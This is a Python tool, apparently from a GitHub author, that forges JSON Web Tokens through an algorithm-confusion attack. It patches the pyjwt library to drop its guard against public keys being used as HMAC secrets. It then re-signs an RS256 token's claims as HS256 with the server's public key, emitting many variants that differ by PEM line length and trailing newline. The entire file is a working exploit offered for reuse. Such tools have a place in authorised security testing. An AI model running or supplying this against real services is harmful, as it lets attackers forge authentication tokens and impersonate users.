#!/usr/bin/env python3
#############################################################
# @AaylaSecura1138, github.com/aayla-secura
# Modify and distribute as you wish
#############################################################

import jwt
import sys
import re
import argparse

def verify_sig(token, pubkey, **kwargs):
    for suffix in ['\n', '']:
        try:
            jwt.decode(token, (pubkey + suffix), **kwargs)
        except jwt.exceptions.InvalidSignatureError:
            continue
        return True, pubkey + suffix
    return False, pubkey

def read_file(fname):
    with open(fname, 'r') as f:
        try:
            return f.read().strip('\n').replace('\r', '')
        except IOError as e:
            sys.stderr.write('Cannot read {}: {}\n'.format(fname, e))
            return None

########## "Fix" pyjwt
# pyjwt's HMACAlgorithm doesn't allow using public keys as secrets, so
# we override it here, removing the check
def prepare_key(self, key):
    key = jwt.utils.force_bytes(key)
    return key


jwt.algorithms.HMACAlgorithm.prepare_key = prepare_key

########## Read cmdline
parser = argparse.ArgumentParser(
    formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    description=(
        'Re-sign a JWT with a public key, '
        'changing its type from RS265 to HS256. Unless disabled, it '
        'will re-sign it once for each possible line length of the '
        'public key (starting at the length of the header line).'))
parser.add_argument(
    '-j', '--jwt-file', dest='jwt_file',
    default='jwt.txt', metavar='FILE',
    help='''File containing the JWT.''')
parser.add_argument(
    '-k', '--key-file', dest='key_file',
    default='key.pem', metavar='FILE',
    help='''File containing the public PEM key.''')
parser.add_argument(
    '-f', '--from-algorithm', dest='from_algorithm',
    default='RS256', metavar='ALGO',
    choices=['RS256', 'RS384', 'RS512'],
    help='''Original algorithm of the JWT.''')
parser.add_argument(
    '-t', '--to-algorithm', dest='to_algorithm',
    default='HS256', metavar='ALGO',
    choices=['HS256', 'HS384', 'HS512'],
    help='''Convert JWT to this algorithm.''')
parser.add_argument(
    '-s', '--verify-signature', dest='verify_sig',
    default=False, action='store_true',
    help='''Verify that the given JWT with the given public key.''')
parser.add_argument(
    '-d', '--delete-headers', dest='delete_headers',
    default=False, action='store_true',
    help='''Delete original headers.''')
parser.add_argument(
    '-n', '--no-vary', dest='no_vary',
    default=False, action='store_true',
    help='''Sign only once with the exact key given.''')
parser.add_argument(
    '-v', '--verbose', dest='verbose',
    default=False, action='store_true',
    help='''Print explanation for each generated token.''')
parser.add_argument(
    '-o', '--output', dest='output',
    metavar='FILE', help='''Save output to FILE.''')
args = parser.parse_args()

########## Verify token with public key
pubkey = read_file(args.key_file)
if not pubkey:
    sys.exit(2)

token = read_file(args.jwt_file)
if not token:
    sys.exit(2)

claims = jwt.decode(token, algorithms=[args.from_algorithm],
                    options=dict(verify_signature=False))
headers = jwt.get_unverified_header(token)
try:
    audience = claims['aud']
except KeyError:
    audience = None

if args.verify_sig:
    ok, pubkey = verify_sig(token,
                            pubkey,
                            algorithms=[args.from_algorithm],
                            audience=audience)
    if not ok:
        sys.stderr.write('Wrong public key! Aborting.\n')
        sys.exit(1)

########## Save original header
try:
    del headers['alg']
except KeyError:
    pass
if args.delete_headers:
    try:
        del headers['typ']
    except KeyError:
        pass
    try:
        del headers['kid']
    except KeyError:
        pass
    try:
        del headers['x5t']
    except KeyError:
        pass

########## Case 1: sign with exact public key only
if args.no_vary:
    sys.stdout.write(jwt.encode(
        claims, pubkey,
        algorithm=args.to_algorithm,
        headers=headers))
    sys.exit(0)

########## Case 2: vary newlines
lines = pubkey.split('\n')
if len(lines) < 3:
    sys.stderr.write('Make sure public key is in a PEM format and '
                     'includes header and footer lines!\n')
    sys.exit(2)

hdr = pubkey.split('\n')[0]
ftr = pubkey.split('\n')[-1]
meat = ''.join(pubkey.split('\n')[1:-1])

output = sys.stdout
verbose_output = sys.stderr
if args.output is not None:
    output = open(args.output, 'w')
    verbose_output = output

sep = '\n-----------------------------------------------------------------\n'
for lgt in range(len(hdr), len(meat) + 1):
    secret = '\n'.join([hdr] + list(filter(
        None, re.split('(.{%s})' % lgt, meat))) + [ftr])
    if args.verbose:
        verbose_output.write(
            ('{sep}--- JWT signed with public key split at lines of length '
             '{lgt}: ---{sep}').format(
                 sep=sep, lgt=lgt))
    output.write('{}\n'.format(jwt.encode(
        claims, secret,
        algorithm=args.to_algorithm,
        headers=headers)))

    secret += '\n'
    if args.verbose:
        verbose_output.write(
            ('{sep}------------- As above, but with a trailing '
             'newline: ------------{sep}').format(
                 sep=sep))
    output.write('{}\n'.format(jwt.encode(
        claims, secret,
        algorithm=args.to_algorithm,
        headers=headers)))

if args.output is not None:
    output.close()
